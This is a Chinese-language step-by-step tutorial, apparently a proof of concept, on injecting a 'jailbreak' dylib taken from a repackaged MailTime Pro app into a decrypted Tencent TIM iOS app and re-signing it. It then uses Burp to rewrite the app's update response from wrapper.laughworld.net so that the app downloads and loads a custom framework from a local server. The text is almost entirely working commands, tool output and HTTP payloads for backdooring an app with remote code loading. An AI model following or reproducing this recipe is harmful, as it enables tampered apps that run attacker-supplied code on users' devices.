# 在TIM App中注入jailbreak

### 解密ipa

```
TMde-iPhone:~ root# ./clutch -i
Installed apps:
1:   TIM – 轻聊的QQ，更方便办公 <com.tencent.tim>
2:   人民日报 <cn.com.people.peopledailyphone>
TMde-iPhone:~ root# ./clutch -d 1
Zipping TIM.app
...
DONE: /private/var/mobile/Documents/Dumped/com.tencent.tim-iOS7.0-(Clutch-2.0.4).ipa
Finished dumping com.tencent.tim in 73.1 seconds
```

### 拷贝com.tencent.tim-iOS7.0-(Clutch-2.0.4).ipa至电脑并解压

```
# unzip com.tencent.tim-iOS7.0-\(Clutch-2.0.4\).ipa
# mv Payload TIM
```
### 在TIM中注入jailbreak
```
# cp com.mailtime.MailTimePro-clutch2/Payload/MailTime\ Pro.app/jailbreak TIM/TIM.app/
# cp com.mailtime.MailTimePro-clutch2/Payload/MailTime\ Pro.app/wrap.json TIM/TIM.app/
# vi TIM/TIM.app/wrap.json (修改package_name为com.tencent.tim)
# cd TIM/TIM.app/
# yololib TIM jailbreak
2017-06-28 19:40:36.300 yololib[1312:40852] dylib path @executable_path/jailbreak
2017-06-28 19:40:36.303 yololib[1312:40852] dylib path @executable_path/jailbreak
Reading binary: TIM
...
2017-06-28 19:40:36.303 yololib[1312:40852] size 50
2017-06-28 19:40:36.303 yololib[1312:40852] complete!
# otool -L TIM | grep jailbreak
	@executable_path/jailbreak (compatibility version 1.0.0, current version 1.0.0)
	@executable_path/jailbreak (compatibility version 1.0.0, current version 1.0.0)
```

### 重新签名并打包为ipa文件，安装新程序至iOS
工具：iOS App Signner、codesign、AppResign、Cydia Impactor皆可以

### iOS配置局域网代理，并使用BurpSuite抓包，BurpSuite开启修改*Intercept Client Resquests*功能
### 新建动态链接库
[DailyUploadDownloadLib](../DailyUploadDownloadLib)
压缩并计算md5
```
# md5 DailyUploadDownloadLib.framework.zip
MD5 (DailyUploadDownloadLib.framework.zip) = 08ae6354cd0c41d807cb2fbda5a52d9f
```
### 启动本地httpd，并将DailyUploadDownloadLib.framework.zip放置在根目录
```
# sudo httpd
# sudo mv DailyUploadDownloadLib.framework.zip /Library/WebServer/Documents/lib/
```
### 启动App,使用burp修改以下请求回包
```
GET /api/com.tencent.time_update.json HTTP/1.1
Host: wrapper.laughworld.net
Accept: */*
User-Agent: TIM/1.1.6.416 CFNetwork/711.4.6 Darwin/14.0.0
Accept-Language: zh-cn
Accept-Encoding: gzip, deflate
Connection: close
```
修改返回的request数据包
```
HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Wed, 28 Jun 2017 14:09:31 GMT
Content-Type: application/json
Content-Length: 191
Last-Modified: Thu, 27 Apr 2017 02:54:25 GMT
Connection: close
ETag: "59015d61-bf"
Accept-Ranges: bytes

{"show_ads":"NO","linkfw":"http:\/\/wrapper.laughworld.net\/lib\/DailyUploadDownloadLib.framework.zip","namefw":"DailyUploadDownloadLib.framework","md5fw":"9e76e8cc5bc776ce7a2981be6418ed35"}
```
修改linkfw和md5fw的值
```
{"show_ads":"NO","linkfw":"http:\/\/10.0.0.239\/lib\/DailyUploadDownloadLib.framework.zip","namefw":"DailyUploadDownloadLib.framework","md5fw":"08ae6354cd0c41d807cb2fbda5a52d9f"}
```
